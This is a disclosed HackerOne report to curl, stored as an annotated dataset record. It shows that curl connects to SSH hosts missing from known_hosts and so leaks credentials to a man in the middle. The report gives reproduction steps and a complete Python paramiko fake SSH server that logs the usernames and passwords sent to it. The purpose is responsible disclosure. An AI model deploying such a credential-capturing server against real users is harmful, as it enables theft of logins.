{
    "reported_to": "curl",
    "reported_by": "nyymi ",
    "title": "curl allows SSH connection even if host is not in known_hosts",
    "content": "\nSummary:\nCurl does not fail if the SSH host identity cannot be verified due to the host not being included in the .ssh/known_hosts file. This makes using curl to login into an previously unknown ssh host system vulnerable to meddler in the middle attacks. When using key based authentication it will allow a malicious host to spoof the real system, and either return tampered or otherwise malicious content on download, or capture the uploads. When using username + password authentication it will also leak the username and password to the attacker, and thus allow the attacker to connect to the intended target host.\nCurl does have --insecure option which is said to:\nCode 275 Bytes\n1              For SFTP and SCP, this option makes curl skip the known_hosts\n2              verification.  known_hosts is a file normally stored in the\n3              user's home directory in the \".ssh\" subdirectory, which contains\n4              hostnames and their public keys.\nFrom this it would be easy to assume that omitting --insecure would mean that the connection is secure, that is: the connection would fail if the host identity can't be verified or curl would prompt the user to verify the host key similar to how SSH command does. However, this is not the case, and the connection will succeed if the host is not in the .ssh/known_hosts file. The current curl behaviour is similar to ssh being used with StrictHostKeyChecking accept-new.\nNote that while curl does warn of the issue with Warning: Couldn't find a known_hosts file this is too late:\nCode 141 Bytes\n1$ curl --user foo sftp://localhost:2222\n2Enter host password for user 'foo':\n3Warning: Couldn't find a known_hosts file\n4curl: (67) Login denied\nThe warning is issued only after the password has been requested. The username & password have already been sent to the malicious server by the time the user sees the warning:\nCode 56 Bytes\n1INFO:root:[pass] Authenticated username foo password bar\nThe warning also is quite useless when curl is being called from scripts as the command is not failing.\nAffected version\n8.11.1\nSteps To Reproduce:\n./configure --with-openssl --with-libssh (or --with-libssh2)\nmake\nHave no entry of targethost in .ssh/known_hostsfile.\n(DY)LD_LIBRARY_PATH=lib/.libs src/curl sftp://foo:bar@targethost\nThe middler in the middle will obtain the credentials:\nCode 56 Bytes\n1INFO:root:[pass] Authenticated username foo password bar\nSupporting Material/References:\nHere's a minimal fake SSH server dumping username & password sent to it. The server runs on port 2222.\nCode 2.47 KiB\n1#!/usr/bin/env python3\n2\n3import paramiko.rsakey\n4import paramiko\n5import threading\n6import logging\n7import socket\n8\n9logging.basicConfig(level = logging.INFO)\n10\n11class SSHServer(paramiko.ServerInterface):\n12    def __init__(self):\n13        self.event = threading.Event()\n14\n15    def get_allowed_auths(self, username):\n16        logging.debug('[auth] Get username {} allowed auths'.format(username))\n17        return \"password,publickey,none\"\n18\n19    def check_auth_none(self, username):\n20        logging.debug('[none] Authenticated username {}'.format(username))\n21        return paramiko.AUTH_FAILED\n22\n23    def check_auth_password(self, username, password):\n24        logging.info('[pass] Authenticated username {} password {}'.format(username, password))\n25        return paramiko.AUTH_FAILED\n26\n27class ClientConnection(threading.Thread):\n28    def __init__(self, group = None, target = None, name = None, args = ()):\n29        threading.Thread.__init__(self, group = group, target = target, name = name)\n30        self.args = args\n31\n32    def run(self):\n33        hostkey = self.args[0]\n34        client = self.args[1]\n35        transport = None\n36        chan = None\n37\n38        try:\n39            transport = paramiko.Transport(client)\n40            try:\n41                transport.load_server_moduli()\n42            except:\n43                pass\n44\n45            transport.add_server_key(hostkey)\n46            server = SSHServer()\n47            try:\n48                transport.start_server(server=server)\n49            except:\n50                logging.warning('*** SSH negotiation failed, disconnect')\n51                client.close()\n52                return\n53\n54            logging.info('Full remote version: {}'.format(transport.remote_version))\n55\n56            chan = transport.accept(10)\n57            if chan:\n58                chan.close()\n59            transport.close()\n60\n61        except Exception as e:\n62            logging.info('*** Caught exception: {}: {}'.format(str(e.__class__), str(e)))\n63            if chan:\n64                chan.close()\n65            if transport:\n66                transport.close()\n67            pass\n68\n69\n70def main():\n71    hostkey = paramiko.rsakey.RSAKey.generate(1024)\n72    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n73    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n74    sock.bind(('', 2222))\n75    sock.listen(7)\n76\n77    while True:\n78        client, addr = sock.accept()\n79        logging.info('Received connection from {}:{}'.format(addr[0], addr[1]))\n80        t = ClientConnection(args = (hostkey, client,))\n81        t.start()\n82\n83if __name__ == '__main__':\n84    main()\n[attachment / reference]\nImpact\nSummary:\nDownload of malicious content (on download).\nLeak of confidential information (on upload).\nLeak of credentials (if using password auth).\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Improper Certificate Validation"
    ],
    "screenshots": {},
    "disclosed_date": 1738809660,
    "report_url": "https://hackerone.com/reports/2961050",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Configure curl with SSH support (--with-openssl --with-libssh or --with-libssh2)"
        ],
        [
            2,
            "Run curl against an unknown SSH host (no entry in .ssh/known_hosts) with credentials: curl sftp://foo:bar@targethost"
        ]
    ],
    "vuln_description": "Curl fails to properly verify SSH host identities when connecting to unknown hosts (not in known_hosts), making it vulnerable to MITM attacks. This allows credential leakage (for password auth) or content manipulation, as curl proceeds with the connection without proper host verification.",
    "reason": "The vulnerability involves understanding curl's SSH behavior and host verification mechanisms, but the core issue is straightforward once the behavior is observed. The attack scenario is common (MITM) and the verification gap is a clear security oversight rather than a complex interaction.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}